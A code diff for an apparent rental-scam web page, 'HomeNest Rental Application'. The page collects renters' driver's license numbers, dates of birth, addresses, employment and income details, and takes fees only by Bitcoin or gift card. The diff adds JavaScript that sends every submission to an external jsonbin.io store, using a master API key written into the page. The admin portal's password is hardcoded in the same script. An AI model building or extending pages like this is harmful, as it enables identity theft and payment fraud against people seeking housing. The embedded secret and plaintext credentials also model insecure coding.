@@ -35,7 +35,6 @@
     line-height: 1.6;
   }
 
-  /* HEADER */
   header {
     background: var(--warm-white);
     border-bottom: 1px solid var(--border);
@@ -74,7 +73,6 @@
     letter-spacing: 0.3px;
   }
 
-  /* HERO SECTION */
   .hero {
     background: linear-gradient(135deg, #2C5364 0%, #1a3a4a 50%, #0f2535 100%);
     color: white;
@@ -131,10 +129,8 @@
     margin-top: 2px;
   }
 
-  /* MAIN CONTENT */
   main { max-width: 780px; margin: 0 auto; padding: 48px 24px 80px; }
 
-  /* SECTION CARDS */
   .section-card {
     background: var(--warm-white);
     border-radius: 16px;
@@ -170,16 +166,11 @@
   }
   .section-subtitle { font-size: 0.82rem; color: var(--mid-gray); margin-top: 2px; }
 
-  /* FORM GRID */
   .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
   .form-grid.cols-3 { grid-template-columns: 1fr 1fr 1fr; }
   .full-width { grid-column: 1 / -1; }
 
-  .field {
-    display: flex;
-    flex-direction: column;
-    gap: 6px;
-  }
+  .field { display: flex; flex-direction: column; gap: 6px; }
   label {
     font-size: 0.8rem;
     font-weight: 600;
@@ -227,17 +218,6 @@
     flex-shrink: 0;
   }
 
-  .field-note {
-    font-size: 0.75rem;
-    color: var(--mid-gray);
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    margin-top: -4px;
-  }
-  .field-note svg { width: 12px; height: 12px; flex-shrink: 0; }
-
-  /* PAYMENT SECTION */
   .payment-card {
     background: linear-gradient(135deg, #1a3a4a 0%, #0f2535 100%);
     border-radius: 16px;
@@ -294,10 +274,7 @@
   }
   .pay-method:hover { border-color: var(--sage-light); background: rgba(122,158,126,0.1); }
   .pay-method.active { border-color: var(--sage-light); background: rgba(122,158,126,0.15); }
-  .pay-method-header {
-    display: flex; align-items: center; gap: 10px;
-    margin-bottom: 12px;
-  }
+  .pay-method-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
   .pay-icon {
     width: 36px; height: 36px;
     border-radius: 8px;
@@ -306,16 +283,8 @@
   }
   .pay-icon.btc { background: #F7931A22; }
   .pay-icon.gift { background: #E91E6322; }
-  .pay-method-name {
-    font-weight: 600;
-    font-size: 0.95rem;
-    color: white;
-  }
-  .pay-method-desc {
-    font-size: 0.8rem;
-    color: rgba(255,255,255,0.5);
-    margin-top: 2px;
-  }
+  .pay-method-name { font-weight: 600; font-size: 0.95rem; color: white; }
+  .pay-method-desc { font-size: 0.8rem; color: rgba(255,255,255,0.5); margin-top: 2px; }
 
   .pay-detail { display: none; }
   .pay-detail.visible { display: block; }
@@ -332,21 +301,14 @@
     margin-top: 10px;
     line-height: 1.5;
   }
-  .btc-instruction {
-    font-size: 0.82rem;
-    color: rgba(255,255,255,0.6);
-    margin-top: 8px;
-    line-height: 1.5;
-  }
+  .btc-instruction { font-size: 0.82rem; color: rgba(255,255,255,0.6); margin-top: 8px; line-height: 1.5; }
   .payment-card label { color: rgba(255,255,255,0.6); }
   .payment-card input, .payment-card textarea {
     background: rgba(255,255,255,0.07);
     border-color: rgba(255,255,255,0.15);
     color: white;
   }
-  .payment-card input::placeholder, .payment-card textarea::placeholder {
-    color: rgba(255,255,255,0.3);
-  }
+  .payment-card input::placeholder, .payment-card textarea::placeholder { color: rgba(255,255,255,0.3); }
   .payment-card input:focus, .payment-card textarea:focus {
     background: rgba(255,255,255,0.1);
     border-color: var(--sage-light);
@@ -373,14 +335,9 @@
     padding: 14px 16px;
     margin-top: 20px;
   }
-  .disclaimer-box p {
-    font-size: 0.8rem;
-    color: rgba(255,255,255,0.5);
-    line-height: 1.55;
-  }
+  .disclaimer-box p { font-size: 0.8rem; color: rgba(255,255,255,0.5); line-height: 1.55; }
   .disclaimer-box strong { color: var(--gold); }
 
-  /* SUBMIT */
   .submit-section { text-align: center; padding: 8px 0 16px; }
   .submit-btn {
     display: inline-flex;
@@ -399,12 +356,9 @@
     letter-spacing: 0.3px;
     box-shadow: 0 4px 20px rgba(78,116,83,0.35);
   }
-  .submit-btn:hover {
-    background: var(--sage-dark);
-    transform: translateY(-2px);
-    box-shadow: 0 8px 28px rgba(78,116,83,0.45);
-  }
+  .submit-btn:hover { background: var(--sage-dark); transform: translateY(-2px); box-shadow: 0 8px 28px rgba(78,116,83,0.45); }
   .submit-btn:active { transform: translateY(0); }
+  .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
   .submit-btn svg { width: 18px; height: 18px; }
 
   .submit-note {
@@ -417,7 +371,6 @@
     gap: 5px;
   }
 
-  /* SUCCESS */
   .success-overlay {
     display: none;
     position: fixed; inset: 0;
@@ -452,27 +405,9 @@
     box-shadow: 0 8px 24px rgba(122,158,126,0.35);
   }
   .success-icon svg { width: 34px; height: 34px; fill: white; }
-  .success-modal h2 {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.6rem;
-    font-weight: 700;
-    color: var(--charcoal);
-    margin-bottom: 12px;
-  }
-  .success-modal p {
-    color: var(--mid-gray);
-    font-size: 0.95rem;
-    line-height: 1.65;
-    margin-bottom: 28px;
-  }
-  .success-ref {
-    background: var(--cream);
-    border-radius: 10px;
-    padding: 14px 20px;
-    font-size: 0.82rem;
-    color: var(--mid-gray);
-    margin-bottom: 28px;
-  }
+  .success-modal h2 { font-family: 'Playfair Display', serif; font-size: 1.6rem; font-weight: 700; color: var(--charcoal); margin-bottom: 12px; }
+  .success-modal p { color: var(--mid-gray); font-size: 0.95rem; line-height: 1.65; margin-bottom: 28px; }
+  .success-ref { background: var(--cream); border-radius: 10px; padding: 14px 20px; font-size: 0.82rem; color: var(--mid-gray); margin-bottom: 28px; }
   .success-ref strong { color: var(--charcoal); }
   .close-success {
     background: var(--sage);
@@ -504,12 +439,7 @@
     padding-bottom: 20px;
     border-bottom: 1px solid rgba(255,255,255,0.1);
   }
-  .admin-title {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.5rem;
-    color: white;
-    display: flex; align-items: center; gap: 12px;
-  }
+  .admin-title { font-family: 'Playfair Display', serif; font-size: 1.5rem; color: white; display: flex; align-items: center; gap: 12px; }
   .admin-badge {
     font-family: 'DM Sans', sans-serif;
     font-size: 0.72rem;
@@ -540,56 +470,66 @@
     gap: 16px;
     margin-bottom: 32px;
   }
-  .admin-stat {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 12px;
-    padding: 20px;
-  }
-  .admin-stat-val {
-    font-family: 'Playfair Display', serif;
-    font-size: 2rem;
-    font-weight: 700;
-    color: white;
-  }
+  .admin-stat { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 20px; }
+  .admin-stat-val { font-family: 'Playfair Display', serif; font-size: 2rem; font-weight: 700; color: white; }
   .admin-stat-label { font-size: 0.78rem; color: rgba(255,255,255,0.45); margin-top: 4px; }
 
+  /* Loading spinner */
+  .admin-loading {
+    text-align: center;
+    padding: 60px 20px;
+    color: rgba(255,255,255,0.4);
+  }
+  .spinner {
+    width: 40px; height: 40px;
+    border: 3px solid rgba(255,255,255,0.1);
+    border-top-color: var(--sage-light);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 16px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Refresh button */
+  .admin-toolbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+  }
+  .admin-toolbar-title {
+    font-size: 0.78rem;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: rgba(255,255,255,0.35);
+  }
+  .btn-refresh {
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.12);
+    color: rgba(255,255,255,0.6);
+    border-radius: 8px;
+    padding: 7px 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.8rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex; align-items: center; gap: 7px;
+  }
+  .btn-refresh:hover { background: rgba(255,255,255,0.12); color: white; }
+  .btn-refresh.loading svg { animation: spin 0.8s linear infinite; }
+
   .applications-list { display: flex; flex-direction: column; gap: 16px; }
-  .app-card {
-    background: rgba(255,255,255,0.04);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 12px;
-    padding: 24px;
-  }
-  .app-card-header {
-    display: flex; align-items: center; justify-content: space-between;
-    margin-bottom: 16px;
-    flex-wrap: wrap; gap: 12px;
-  }
-  .app-name {
-    font-weight: 600; color: white; font-size: 1rem;
-  }
+  .app-card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 24px; }
+  .app-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; flex-wrap: wrap; gap: 12px; }
+  .app-name { font-weight: 600; color: white; font-size: 1rem; }
   .app-meta { font-size: 0.78rem; color: rgba(255,255,255,0.4); margin-top: 2px; }
 
-  .status-pill {
-    font-size: 0.72rem;
-    font-weight: 600;
-    padding: 4px 12px;
-    border-radius: 20px;
-    letter-spacing: 0.5px;
-    text-transform: uppercase;
-  }
+  .status-pill { font-size: 0.72rem; font-weight: 600; padding: 4px 12px; border-radius: 20px; letter-spacing: 0.5px; text-transform: uppercase; }
   .status-pending { background: rgba(201,168,76,0.15); color: var(--gold); border: 1px solid rgba(201,168,76,0.3); }
   .status-approved { background: rgba(122,158,126,0.15); color: var(--sage-light); border: 1px solid rgba(122,158,126,0.3); }
   .status-rejected { background: rgba(192,57,43,0.15); color: #E57373; border: 1px solid rgba(192,57,43,0.3); }
 
-  .app-details {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-    gap: 12px;
-    margin-bottom: 16px;
-  }
-  .app-detail-item { }
+  .app-details { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-bottom: 16px; }
   .app-detail-label { font-size: 0.7rem; color: rgba(255,255,255,0.35); text-transform: uppercase; letter-spacing: 0.5px; }
   .app-detail-val { font-size: 0.88rem; color: rgba(255,255,255,0.75); margin-top: 2px; }
 
@@ -608,15 +548,10 @@
   .btn-approve:hover { background: var(--sage); color: white; }
   .btn-reject { background: rgba(192,57,43,0.15); color: #E57373; border: 1px solid rgba(192,57,43,0.25); }
   .btn-reject:hover { background: rgba(192,57,43,0.3); }
+  .btn-approve:disabled, .btn-reject:disabled { opacity: 0.4; cursor: not-allowed; }
 
   .log-section { margin-top: 40px; }
-  .log-title {
-    font-size: 0.78rem;
-    text-transform: uppercase;
-    letter-spacing: 1.5px;
-    color: rgba(255,255,255,0.35);
-    margin-bottom: 12px;
-  }
+  .log-title { font-size: 0.78rem; text-transform: uppercase; letter-spacing: 1.5px; color: rgba(255,255,255,0.35); margin-bottom: 12px; }
   .log-entries {
     background: rgba(0,0,0,0.3);
     border: 1px solid rgba(255,255,255,0.07);
@@ -632,27 +567,12 @@
   .log-entry.log-info .log-event { color: var(--sage-light); }
   .log-entry.log-action .log-event { color: var(--gold); }
   .log-entry.log-warn .log-event { color: #E57373; }
+  .log-entry.log-error .log-event { color: #FF6B6B; }
 
-  .admin-login {
-    max-width: 380px;
-    margin: 100px auto 0;
-    background: rgba(255,255,255,0.04);
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 16px;
-    padding: 40px;
-  }
-  .admin-login h2 {
-    font-family: 'Playfair Display', serif;
-    color: white; text-align: center;
-    margin-bottom: 8px;
-  }
+  .admin-login { max-width: 380px; margin: 100px auto 0; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 40px; }
+  .admin-login h2 { font-family: 'Playfair Display', serif; color: white; text-align: center; margin-bottom: 8px; }
   .admin-login p { color: rgba(255,255,255,0.45); text-align: center; font-size: 0.85rem; margin-bottom: 28px; }
-  .admin-login input {
-    background: rgba(255,255,255,0.06);
-    border-color: rgba(255,255,255,0.12);
-    color: white;
-    margin-bottom: 14px;
-  }
+  .admin-login input { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); color: white; margin-bottom: 14px; }
   .admin-login input::placeholder { color: rgba(255,255,255,0.3); }
   .admin-login-btn {
     width: 100%;
@@ -671,7 +591,26 @@
   .admin-login-btn:hover { background: var(--sage-dark); }
   .admin-login-error { color: #E57373; font-size: 0.82rem; text-align: center; margin-top: 10px; display: none; }
 
-  /* FOOTER */
+  /* Toast notification */
+  .toast {
+    position: fixed;
+    bottom: 24px; right: 24px;
+    background: #1a3a4a;
+    border: 1px solid rgba(255,255,255,0.12);
+    color: white;
+    padding: 12px 20px;
+    border-radius: 10px;
+    font-size: 0.85rem;
+    z-index: 9999;
+    transform: translateY(80px);
+    opacity: 0;
+    transition: all 0.3s cubic-bezier(0.34,1.56,0.64,1);
+    max-width: 320px;
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+  .toast.success { border-left: 3px solid var(--sage); }
+  .toast.error { border-left: 3px solid #E57373; }
+
   footer {
     background: var(--warm-white);
     border-top: 1px solid var(--border);
@@ -679,16 +618,8 @@
     text-align: center;
   }
   footer p { font-size: 0.8rem; color: var(--mid-gray); line-height: 1.7; }
-  footer .admin-link {
-    color: var(--sage);
-    font-size: 0.75rem;
-    cursor: pointer;
-    text-decoration: underline;
-    margin-top: 6px;
-    display: inline-block;
-  }
+  footer .admin-link { color: var(--sage); font-size: 0.75rem; cursor: pointer; text-decoration: underline; margin-top: 6px; display: inline-block; }
 
-  /* RESPONSIVE */
   @media (max-width: 600px) {
     header { padding: 14px 20px; }
     .hero { padding: 48px 24px 56px; }
@@ -709,9 +640,7 @@
 <!-- HEADER -->
 <header>
   <div class="logo-mark">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
-    </svg>
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
   </div>
   <div class="brand-name">Home<span>Nest</span></div>
   <div class="header-badge">🔒 Secure Application</div>
@@ -721,20 +650,11 @@
 <div class="hero">
   <div class="hero-eyebrow">Rental Application Portal</div>
   <h1>HomeNest Rental Application</h1>
-  <p>Apply to rent your next home بسهولة and securely</p>
+  <p>Apply to rent your next home easily and securely</p>
   <div class="hero-stats">
-    <div class="stat">
-      <div class="stat-num">5min</div>
-      <div class="stat-label">Quick Apply</div>
-    </div>
-    <div class="stat">
-      <div class="stat-num">256-bit</div>
-      <div class="stat-label">SSL Encrypted</div>
-    </div>
-    <div class="stat">
-      <div class="stat-num">24hr</div>
-      <div class="stat-label">Response Time</div>
-    </div>
+    <div class="stat"><div class="stat-num">5min</div><div class="stat-label">Quick Apply</div></div>
+    <div class="stat"><div class="stat-num">256-bit</div><div class="stat-label">SSL Encrypted</div></div>
+    <div class="stat"><div class="stat-num">24hr</div><div class="stat-label">Response Time</div></div>
   </div>
 </div>
 
@@ -769,7 +689,6 @@
         <label>Email Address <span class="req">*</span></label>
         <input type="email" name="email" placeholder="john@example.com" required>
       </div>
-
       <div class="field">
         <label>Driver's License / State ID <span class="req">*</span></label>
         <input type="text" name="license" placeholder="e.g. D1234567" required>
@@ -926,7 +845,7 @@
       </div>
       <div class="field full-width" id="petDetails" style="display:none">
         <label>Pet Details</label>
-        <textarea name="petDetails" placeholder="Type, breed, weight, age... (e.g. 1 golden retriever, 45 lbs, 3 years old)"></textarea>
+        <textarea name="petDetails" placeholder="Type, breed, weight, age..."></textarea>
       </div>
       <div class="field full-width">
         <label>Emergency Contact <span class="req">*</span></label>
@@ -963,7 +882,6 @@
     <div style="font-size:0.82rem;color:rgba(255,255,255,0.55);margin-bottom:16px;">Select your preferred payment method:</div>
 
     <div class="payment-methods">
-      <!-- Bitcoin -->
       <div class="pay-method active" id="method-btc" onclick="selectMethod('btc')">
         <div class="pay-method-header">
           <div class="pay-icon btc">₿</div>
@@ -982,7 +900,6 @@
         </div>
       </div>
 
-      <!-- Gift Card -->
       <div class="pay-method" id="method-gift" onclick="selectMethod('gift')">
         <div class="pay-method-header">
           <div class="pay-icon gift">🎁</div>
@@ -1012,7 +929,7 @@
 
   <!-- SUBMIT -->
   <div class="submit-section">
-    <button type="submit" class="submit-btn">
+    <button type="submit" class="submit-btn" id="submitBtn">
       <svg viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
       Submit Application
     </button>
@@ -1049,19 +966,17 @@
 
 <!-- ADMIN PANEL -->
 <div class="admin-panel" id="adminPanel">
-  <!-- LOGIN SCREEN -->
   <div id="adminLogin">
     <div class="admin-login">
       <h2>Agent Portal</h2>
       <p>Sign in to review and manage rental applications</p>
       <input type="text" id="adminUser" placeholder="Username" autocomplete="off">
-      <input type="password" id="adminPass" placeholder="Password" autocomplete="off">
+      <input type="password" id="adminPass" placeholder="Password" autocomplete="off" onkeydown="if(event.key==='Enter')doAdminLogin()">
       <button class="admin-login-btn" onclick="doAdminLogin()">Sign In</button>
       <div class="admin-login-error" id="adminError">Invalid credentials. Please try again.</div>
     </div>
   </div>
 
-  <!-- DASHBOARD -->
   <div id="adminDashboard" style="display:none">
     <div class="admin-header">
       <div class="admin-title">
@@ -1072,46 +987,77 @@
     </div>
 
     <div class="admin-stats">
-      <div class="admin-stat">
-        <div class="admin-stat-val" id="stat-total">0</div>
-        <div class="admin-stat-label">Total Applications</div>
-      </div>
-      <div class="admin-stat">
-        <div class="admin-stat-val" id="stat-pending">0</div>
-        <div class="admin-stat-label">Pending Review</div>
-      </div>
-      <div class="admin-stat">
-        <div class="admin-stat-val" id="stat-approved">0</div>
-        <div class="admin-stat-label">Approved</div>
-      </div>
-      <div class="admin-stat">
-        <div class="admin-stat-val" id="stat-rejected">0</div>
-        <div class="admin-stat-label">Rejected</div>
-      </div>
+      <div class="admin-stat"><div class="admin-stat-val" id="stat-total">—</div><div class="admin-stat-label">Total Applications</div></div>
+      <div class="admin-stat"><div class="admin-stat-val" id="stat-pending">—</div><div class="admin-stat-label">Pending Review</div></div>
+      <div class="admin-stat"><div class="admin-stat-val" id="stat-approved">—</div><div class="admin-stat-label">Approved</div></div>
+      <div class="admin-stat"><div class="admin-stat-val" id="stat-rejected">—</div><div class="admin-stat-label">Rejected</div></div>
+    </div>
+
+    <div class="admin-toolbar">
+      <div class="admin-toolbar-title">Applications</div>
+      <button class="btn-refresh" id="refreshBtn" onclick="loadApplications()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+        Refresh
+      </button>
     </div>
 
     <div class="applications-list" id="applicationsList">
-      <p style="color:rgba(255,255,255,0.35);font-size:0.9rem;text-align:center;padding:40px">No applications submitted yet.</p>
+      <div class="admin-loading"><div class="spinner"></div><p>Loading applications...</p></div>
     </div>
 
     <div class="log-section">
       <div class="log-title">System Activity Log</div>
       <div class="log-entries" id="logEntries">
-        <div class="log-entry log-info"><span class="log-time">[SYSTEM]</span><span class="log-event">Admin portal initialized</span></div>
+        <div class="log-entry log-info"><span class="log-time">[SYSTEM]</span><span class="log-event"> Admin portal initialized</span></div>
       </div>
     </div>
   </div>
 </div>
 
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
 <script>
-  // ---- State ----
-  const apps = [];
+  // =============================================
+  // JSONBin Configuration
+  // =============================================
+  const JSONBIN_BIN_ID = '69fa47d136566621a82baca9';
+  const JSONBIN_API_KEY = '$2a$10$V.2Sp7axXfgDWu1AJKTGbeaMonE53f1qPDRlSKMiss.JtupJHEd8C';
+  const JSONBIN_BASE = 'https://api.jsonbin.io/v3/b';
+
+  // =============================================
+  // JSONBin API helpers
+  // =============================================
+  async function fetchBin() {
+    const res = await fetch(`${JSONBIN_BASE}/${JSONBIN_BIN_ID}/latest`, {
+      headers: { 'X-Master-Key': JSONBIN_API_KEY }
+    });
+    if (!res.ok) throw new Error(`Fetch failed: ${res.status}`);
+    const json = await res.json();
+    return json.record;
+  }
+
+  async function updateBin(data) {
+    const res = await fetch(`${JSONBIN_BASE}/${JSONBIN_BIN_ID}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': JSONBIN_API_KEY
+      },
+      body: JSON.stringify(data)
+    });
+    if (!res.ok) throw new Error(`Update failed: ${res.status}`);
+    return await res.json();
+  }
+
+  // =============================================
+  // Local logs (session only)
+  // =============================================
   const logs = [];
 
   function addLog(type, msg) {
-    const now = new Date();
-    const time = now.toLocaleTimeString('en-US',{hour12:false});
-    logs.unshift({type,time,msg});
+    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+    logs.unshift({ type, time, msg });
     renderLogs();
   }
 
@@ -1120,74 +1066,132 @@
     if (!el) return;
     el.innerHTML = logs.map(l =>
       `<div class="log-entry log-${l.type}"><span class="log-time">[${l.time}]</span> <span class="log-event">${l.msg}</span></div>`
-    ).join('') || '<div class="log-entry"><span class="log-event">No logs yet.</span></div>';
+    ).join('') || '<div class="log-entry log-info"><span class="log-event">No logs yet.</span></div>';
   }
 
-  // ---- Payment method toggle ----
+  // =============================================
+  // Toast
+  // =============================================
+  function showToast(msg, type = 'success') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = `toast ${type} show`;
+    setTimeout(() => t.className = 'toast', 3200);
+  }
+
+  // =============================================
+  // Payment method toggle
+  // =============================================
   function selectMethod(method) {
-    ['btc','gift'].forEach(m => {
-      document.getElementById('method-'+m).classList.toggle('active', m === method);
-      document.getElementById('detail-'+m).classList.toggle('visible', m === method);
+    ['btc', 'gift'].forEach(m => {
+      document.getElementById('method-' + m).classList.toggle('active', m === method);
+      document.getElementById('detail-' + m).classList.toggle('visible', m === method);
     });
   }
 
-  // ---- Pets toggle ----
+  // =============================================
+  // Pets toggle
+  // =============================================
   function togglePets(radio) {
     document.getElementById('petDetails').style.display = radio.value === 'yes' ? 'block' : 'none';
   }
 
-  // ---- Form submission ----
-  document.getElementById('rentalForm').addEventListener('submit', function(e) {
+  // =============================================
+  // Form submission → save to JSONBin
+  // =============================================
+  document.getElementById('rentalForm').addEventListener('submit', async function (e) {
     e.preventDefault();
     const form = e.target;
     const inputs = form.querySelectorAll('[required]');
     let valid = true;
     inputs.forEach(inp => {
       inp.classList.remove('error');
-      if (!inp.value.trim()) {
-        inp.classList.add('error');
-        valid = false;
-      }
+      if (!inp.value.trim()) { inp.classList.add('error'); valid = false; }
     });
     if (!valid) {
       const firstError = form.querySelector('.error');
-      if (firstError) firstError.scrollIntoView({behavior:'smooth', block:'center'});
+      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
       return;
     }
 
-    // Collect data
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" style="animation:spin 0.8s linear infinite"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Submitting...`;
+
     const fd = new FormData(form);
     const data = Object.fromEntries(fd.entries());
     const refNum = 'HN-' + Date.now().toString().slice(-6);
-    const payMethod = document.querySelector('.pay-method.active') ?
-      (document.getElementById('method-btc').classList.contains('active') ? 'Bitcoin' : 'Gift Card') : 'Unknown';
+    const isBtc = document.getElementById('method-btc').classList.contains('active');
+    const payMethod = isBtc ? 'Bitcoin' : 'Gift Card';
 
-    const app = {
+    const newApp = {
       id: refNum,
       name: data.fullName || '—',
       email: data.email || '—',
       phone: data.phone || '—',
-      income: data.monthlyIncome || '—',
-      employer: data.employerName || '—',
+      dob: data.dob || '—',
+      license: data.license || '—',
+      streetAddress: data.streetAddress || '—',
+      city: data.city || '—',
+      state: data.state || '—',
+      zip: data.zip || '—',
+      lengthOfStay: data.lengthOfStay || '—',
+      reasonLeaving: data.reasonLeaving || '—',
+      employerName: data.employerName || '—',
+      jobTitle: data.jobTitle || '—',
+      monthlyIncome: data.monthlyIncome || '—',
+      supervisorName: data.supervisorName || '—',
+      supervisorContact: data.supervisorContact || '—',
+      prevLandlord: data.prevLandlord || '—',
+      landlordContact: data.landlordContact || '—',
+      prevRent: data.prevRent || '—',
+      tenancyDates: data.tenancyDates || '—',
+      occupants: data.occupants || '—',
+      pets: data.pets || 'no',
+      petDetails: data.petDetails || '—',
+      emergencyContact: data.emergencyContact || '—',
       payMethod,
-      payRef: payMethod === 'Bitcoin' ? (data.btcTxid || 'Not provided') : (data.giftCode || 'Not provided'),
+      payRef: isBtc ? (data.btcTxid || 'Not provided') : (data.giftCode || 'Not provided'),
+      giftCardType: data.giftCardType || '—',
       status: 'pending',
+      submittedAt: new Date().toISOString(),
       time: new Date().toLocaleString()
     };
-    apps.unshift(app);
-    addLog('info', `New application received: ${app.name} (${refNum}) via ${payMethod}`);
 
-    document.getElementById('refNumber').textContent = refNum;
-    document.getElementById('successOverlay').classList.add('show');
-    form.reset();
-    document.getElementById('petDetails').style.display = 'none';
+    try {
+      // Read current bin, append new app, write back
+      let record;
+      try {
+        record = await fetchBin();
+      } catch (err) {
+        // Bin might be empty/uninitialized
+        record = { submissions: [] };
+      }
+      if (!record.submissions) record.submissions = [];
+      record.submissions.unshift(newApp);
+      await updateBin(record);
+
+      document.getElementById('refNumber').textContent = refNum;
+      document.getElementById('successOverlay').classList.add('show');
+      form.reset();
+      document.getElementById('petDetails').style.display = 'none';
+      selectMethod('btc');
+    } catch (err) {
+      showToast('Submission failed. Please try again.', 'error');
+      console.error(err);
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="white" width="18" height="18"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Submit Application`;
+    }
   });
 
   function closeSuccess() {
     document.getElementById('successOverlay').classList.remove('show');
   }
 
-  // ---- Admin Panel ----
+  // =============================================
+  // Admin Panel
+  // =============================================
   function openAdmin() {
     document.getElementById('adminPanel').classList.add('show');
     document.getElementById('adminLogin').style.display = 'block';
@@ -1207,26 +1211,48 @@
     if (u === 'admin' && p === 'homenest2025') {
       document.getElementById('adminLogin').style.display = 'none';
       document.getElementById('adminDashboard').style.display = 'block';
-      renderDashboard();
       addLog('action', `Admin logged in at ${new Date().toLocaleTimeString()}`);
+      loadApplications();
     } else {
       document.getElementById('adminError').style.display = 'block';
     }
   }
 
-  function renderDashboard() {
-    const total = apps.length;
-    const pending = apps.filter(a => a.status === 'pending').length;
-    const approved = apps.filter(a => a.status === 'approved').length;
-    const rejected = apps.filter(a => a.status === 'rejected').length;
-
-    document.getElementById('stat-total').textContent = total;
-    document.getElementById('stat-pending').textContent = pending;
-    document.getElementById('stat-approved').textContent = approved;
-    document.getElementById('stat-rejected').textContent = rejected;
-
+  // =============================================
+  // Load applications from JSONBin
+  // =============================================
+  async function loadApplications() {
+    const refreshBtn = document.getElementById('refreshBtn');
     const list = document.getElementById('applicationsList');
-    if (apps.length === 0) {
+    refreshBtn.classList.add('loading');
+    list.innerHTML = '<div class="admin-loading"><div class="spinner"></div><p>Loading applications...</p></div>';
+
+    try {
+      const record = await fetchBin();
+      const apps = record.submissions || [];
+      addLog('info', `Loaded ${apps.length} application(s) from storage`);
+      renderDashboard(apps);
+    } catch (err) {
+      addLog('error', `Failed to load applications: ${err.message}`);
+      list.innerHTML = `<p style="color:#E57373;font-size:0.9rem;text-align:center;padding:40px">⚠ Failed to load applications.<br><small style="opacity:0.6">${err.message}</small></p>`;
+      updateStats([], );
+    } finally {
+      refreshBtn.classList.remove('loading');
+    }
+  }
+
+  function updateStats(apps) {
+    document.getElementById('stat-total').textContent = apps.length;
+    document.getElementById('stat-pending').textContent = apps.filter(a => a.status === 'pending').length;
+    document.getElementById('stat-approved').textContent = apps.filter(a => a.status === 'approved').length;
+    document.getElementById('stat-rejected').textContent = apps.filter(a => a.status === 'rejected').length;
+  }
+
+  function renderDashboard(apps) {
+    updateStats(apps);
+    const list = document.getElementById('applicationsList');
+
+    if (!apps || apps.length === 0) {
       list.innerHTML = '<p style="color:rgba(255,255,255,0.35);font-size:0.9rem;text-align:center;padding:40px">No applications submitted yet.</p>';
       return;
     }
@@ -1235,35 +1261,70 @@
       <div class="app-card" id="card-${app.id}">
         <div class="app-card-header">
           <div>
-            <div class="app-name">${app.name}</div>
-            <div class="app-meta">Submitted ${app.time} · Ref: ${app.id}</div>
+            <div class="app-name">${escHtml(app.name)}</div>
+            <div class="app-meta">Submitted ${escHtml(app.time)} · Ref: ${escHtml(app.id)}</div>
           </div>
           <span class="status-pill status-${app.status}">${app.status}</span>
         </div>
         <div class="app-details">
-          <div class="app-detail-item"><div class="app-detail-label">Email</div><div class="app-detail-val">${app.email}</div></div>
-          <div class="app-detail-item"><div class="app-detail-label">Phone</div><div class="app-detail-val">${app.phone}</div></div>
-          <div class="app-detail-item"><div class="app-detail-label">Employer</div><div class="app-detail-val">${app.employer}</div></div>
-          <div class="app-detail-item"><div class="app-detail-label">Monthly Income</div><div class="app-detail-val">${app.income}</div></div>
-          <div class="app-detail-item"><div class="app-detail-label">Payment Method</div><div class="app-detail-val">${app.payMethod}</div></div>
-          <div class="app-detail-item"><div class="app-detail-label">Payment Ref</div><div class="app-detail-val" style="word-break:break-all;font-size:0.78rem">${app.payRef}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Email</div><div class="app-detail-val">${escHtml(app.email)}</div></div>
+          <div class="app-detail-item"><div class="app-detail-label">Phone</div><div class="app-detail-val">${escHtml(app.phone)}</div></div>
